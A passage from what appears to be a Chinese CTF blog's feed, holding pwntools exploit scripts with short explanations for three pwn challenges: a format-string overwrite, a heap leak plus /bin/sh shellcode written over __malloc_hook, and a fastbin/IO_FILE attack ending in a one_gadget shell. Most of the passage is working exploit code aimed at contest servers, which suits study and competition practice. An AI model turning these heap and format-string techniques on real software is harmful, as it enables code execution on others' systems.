class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span> , <span class="number">0x4f3c2</span> , <span class="number">0x10a45c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------stack----------------</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(<span class="number">83</span>)+<span class="string">'$p'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line">con=p.recv()</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">29</span>:<span class="number">41</span>],<span class="number">16</span>)</span><br><span class="line">libc.address=leak<span class="number">-0x21b97</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">43</span>:<span class="number">55</span>],<span class="number">16</span>)</span><br><span class="line">main_addr=leak<span class="number">-0xe0</span></span><br><span class="line"></span><br><span class="line">rbp_addr=leak<span class="number">-0x200</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"main_addr"</span>,main_addr)</span><br><span class="line">info(<span class="string">"rbp_addr"</span>,rbp_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack=(main_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(libc.address+one[<span class="number">1</span>]&amp;<span class="number">0xffff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=((main_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(((libc.address+one[<span class="number">1</span>])&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=(rbp_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"><span class="comment">#dbg(0x12B1)</span></span><br><span class="line"></span><br><span class="line">attack=<span class="number">0xc1</span></span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><p>先泄露出libc_addr，程序申请出了一段固定的可读可写可执行的区域，在里面先填充为shellcode，7功能里面可以溢出修改到<code>__malloc_hook</code>,修改为shellcode的地址即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"./oldschool"</span></span><br><span class="line">arch = <span class="string">'32'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'106.14.214.3'</span>, <span class="number">2333</span></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment"># context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p=process(pwn_name)</span><br><span class="line">    <span class="comment"># p = process(["/glibc/2.23/64/lib/ld-2.23.so", "./pwn"], env=&#123;"LD_PRELOAD": "/glibc/2.23/64/lib/libc.so.6"&#125;)</span></span><br><span class="line">    <span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwn_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func, libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con, leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con, leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(p,exe=<span class="string">"./oldschool"</span>)</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script = <span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script = <span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        <span class="comment"># gdb.attach(p, script)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(address)</span>:</span></span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(idx, val)</span>:</span></span><br><span class="line">    choice(<span class="number">7</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele2</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_me</span><span class="params">(address,string_me)</span>:</span></span><br><span class="line">    shellcode = string_me + <span class="string">b"\x00"</span> * <span class="number">4</span></span><br><span class="line">    shellcode = shellcode[<span class="number">0</span>:(len(shellcode) // <span class="number">4</span>) * <span class="number">4</span>]</span><br><span class="line">    print(shellcode)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">0</span>, len(shellcode) , <span class="number">4</span>):</span><br><span class="line">        print(int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        print(hex(address+i),shellcode[item:item + <span class="number">4</span>])</span><br><span class="line">        edit2(address+i, int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span><span class="params">(address)</span>:</span></span><br><span class="line">    index = (address - <span class="number">0xe0000000</span>) // <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="comment"># -------------stack----------------</span></span><br><span class="line"><span class="comment"># add(0, 0x68)</span></span><br><span class="line"><span class="comment"># add(1, 0x68)</span></span><br><span class="line"><span class="comment"># add(2, 0x68)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(0, 'a' * 0x68 + '\n')</span></span><br><span class="line">shellcode=<span class="string">b"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80"</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    free(item)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_info=p.recvuntil(<span class="string">"\x0a"</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">libc_addr=u32(libc_info[<span class="number">9</span>:<span class="number">9</span>+<span class="number">4</span>])<span class="number">-0x1d8828</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_me(<span class="number">0</span>,shellcode)<span class="comment">#写入shellcode</span></span><br><span class="line">print(hex(libc_addr+<span class="number">0x1d8788</span>))</span><br><span class="line"></span><br><span class="line">write_me(get_index(libc_addr+<span class="number">0x1d8788</span>),p32(<span class="number">0xe0000000</span>))<span class="comment">#malloc_hook</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p>程序没有show功能，还限制了fastbin的大小，利用unsorted bin 攻击 global_max_fast，然后fastbin attack 打iofile，泄露libc_addr,再次fastbin attack打 <code>__malloc_hook</code>为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p = process('./easypwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./easypwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-easypwn.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd2</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size:\n"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"content:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"n"</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2--&gt;1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">"n"</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#5--&gt;4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span><span class="number">-0x5</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">7</span>,p16(<span class="number">0x25dd</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,<span class="string">"11"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c5600</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">og = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one = libc_base + og[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"n"</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。&lt;/p&gt;
&lt;p&gt;最终48名，尽力了，没有进线下。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://nocbtm.github.io/imgs/ISEE3DP466
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020国赛线上赛 pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/22/2020%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/22/2020国赛线上赛-pwn-wp/</id>
    <published>2020-08-22T11:24:30.000Z</published>
    <updated>2020-12-06T02:27:39.000Z</updated>
    
